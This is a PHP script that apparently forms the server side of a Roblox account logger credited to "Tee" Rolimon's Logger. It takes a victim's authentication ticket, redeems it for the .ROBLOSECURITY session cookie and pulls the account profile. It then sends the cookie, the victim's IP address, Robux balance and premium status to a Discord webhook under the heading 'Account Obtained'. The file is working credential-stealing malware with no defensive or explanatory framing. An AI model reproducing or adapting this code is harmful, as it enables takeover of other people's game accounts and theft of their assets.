<?php
function GetUserIpAddress(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
    require("config.php");
    header("Access-Control-Allow-Origin: *");

    if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
        die();
    }

    $ticket = $_GET["t"];
    if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
        die();
    }

    // request for auth2cookie
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
                "{\"authenticationTicket\": \"$ticket\"}");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Referer: https://www.roblox.com/games/1818/--',
        'Origin: https://www.roblox.com',
        'User-Agent: Roblox/WinInet',
        'RBXAuthenticationNegotiation: 1'
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    // attempt to find set-cookie header for .ROBLOSECURITY
    $cookie = null;

    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        
        if (account_filter($profile)) {
            $hookObject = json_encode([
                "content" => "@everyone",
                "embeds" => [
                    [
                        "title" => "Account Obtained",
                        "type" => "rich",
                        "description" => "",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "timestamp" => date("c"),
                        "color" => hexdec("A9A9A9"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=". $profile["UserID"] . "&width=420&height=420&format=png"
                        ],
                        "author" => [
                            "name" => "\"Tee\" Rolimon's Logger",
                            "url" => "https://github.com/TeeScrap"
                        ],
                        "fields" => [
                            [
                                "name" => "Name",
                                "value" => $profile["UserName"]
                            ],
                            [
                                "name" => "<:robux:654458613510701076> Robux",
                                "value" => $profile["RobuxBalance"]
                            ],
                            [
                                "name" => "<:premium:730164927872106595> Is Premium?",
                                "value" => $profile["IsPremium"]
                            ],
                            [
                                "name" => "<:Rolimons:788322681778733056> Rolimons link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                            ],
                            [
                                "name" => "<:Ip:788322737000415242> Ip",
                                "value" => GetUserIpAddress()
                            ],
                            [
                                "name" => "\u{1F36A} Cookie",
                                "value" => "```" . $cookie . "```"
                            ],
                        ]
                    ]
                ]
            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $webhook,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
        }
    }
?>